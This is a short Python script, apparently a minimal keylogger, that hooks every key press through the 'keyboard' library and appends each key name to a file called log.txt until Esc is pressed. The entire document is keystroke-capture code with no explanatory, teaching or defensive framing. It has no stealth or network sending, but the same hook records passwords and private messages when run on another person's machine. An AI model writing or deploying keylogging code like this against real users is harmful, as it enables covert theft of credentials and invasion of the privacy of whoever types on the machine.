import keyboard

with open("log.txt", "a") as f:

    def registrar(evento):
      
      f.write(evento.name)
      
keyboard.on_press(registrar)
keyboard.wait("esc")
